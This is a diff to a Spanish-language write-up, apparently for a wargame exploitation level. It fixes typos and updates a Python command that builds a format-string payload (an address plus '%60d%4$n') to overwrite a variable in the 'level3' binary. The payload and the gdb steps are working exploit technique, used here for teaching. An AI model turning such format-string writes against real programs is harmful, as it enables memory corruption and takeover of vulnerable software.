@@ -11,7 +11,7 @@
     0x08048520 <+6>:	call   0x80484a4 <v>
     [...]
 
-3.- Desensamblamos v
+3.- Desensamblamos v()
   (gdb) disassemble v
 
 4.- Vemos que el vector de ataque de gets() que hemos utilizado en anteriores ejercicios en principio,
@@ -68,7 +68,7 @@
     printf("x= %d\n", x);
     [...]
     
-15.- También, la función printf podemos alterar la posicion de una flag con [num]$
+15.- También, con la función printf podemos alterar la posicion de una flag con [num]$
     [...]
     printf("%2$d es el segundo argumento, %1$d es el primero\n", 10, 20);
     [...]
@@ -78,11 +78,11 @@
 
 17.- Vamos a montar la cadena formateada
     1.- La dirección de donde obtiene el valor eax en little endian: \x8c\x98\x04\x08
-    2.- Asignaremos 60 caracteres medio de padding de una flag: %60d (60 characteres + 4 address = 64 = 0x40)
+    2.- Asignaremos 60 caracteres por medio de padding de una flag: %60d (60 characteres + 4 address = 64 = 0x40)
     3.- Por medio de $4 y %n asignaremos a la posición 4 de los parametros el valor: %4$n 
     [...]
     python -c 'print "\x8c\x98\x04\x08" + "%60d%4$n"' > /tmp/payload
-    python -c 'import sys; sys.stdout.write(p"\x8c\x98\x04\x08" + p"%60d%4$n")' > /tmp/payload
+    python -c 'import sys; sys.stdout.buffer.write(b"\x8c\x98\x04\x08" + b"%60d%4$n")' > payload
 
 18.- Se lo pasaremos al binario por el imput con cat
     cat /tmp/payload - | ./level3
